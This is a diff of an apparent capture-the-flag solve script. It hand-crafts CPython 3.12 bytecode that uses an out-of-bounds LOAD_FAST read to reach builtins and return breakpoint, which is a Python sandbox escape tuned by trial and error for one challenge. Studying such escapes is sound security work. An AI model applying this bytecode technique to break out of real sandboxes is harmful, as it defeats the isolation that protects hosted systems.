@@ -2,7 +2,7 @@ from dis import opmap, dis
 # https://docs.python.org/3.12/library/dis.html#python-bytecode-instructions
 # Ini ada OOB di LOAD_FAST cuma dia beda tiap program?????
 # Kalo di challenge file dia ada di index 42 ('*')
-BUILTINS_INDEX = 40
+BUILTINS_INDEX = 42
 
 LOAD_FAST = opmap['LOAD_FAST']
 RETURN_VALUE = opmap['RETURN_VALUE']
@@ -15,7 +15,7 @@ print(LOAD_FAST, RETURN_VALUE)
 def f():
     pass
 
-# Magically get builtins
+# Magiccally get builtins
 code = bytes([
     LOAD_FAST, BUILTINS_INDEX,
     LOAD_FAST, BUILTINS_INDEX,
@@ -23,10 +23,8 @@ code = bytes([
  
 code += UNPACK_EX + SWAP_STACK + POP + BUILD_TUPLE + DUMP_TO_STACK
 
-# Swap breakpoint
-code += bytes([
-    *b'c', 109
-])
+# Nyoba nyoba sampe dapet breakpoint di stack
+code += POP * 108
 
 # Return function breakpoint
 code += bytes([
@@ -36,4 +34,4 @@ code += bytes([
 print(len(code))
 f.__code__ = f.__code__.replace(co_names=(), co_code=code)
 print(f.__code__.co_code)
-f()()
+print(repr(f()))
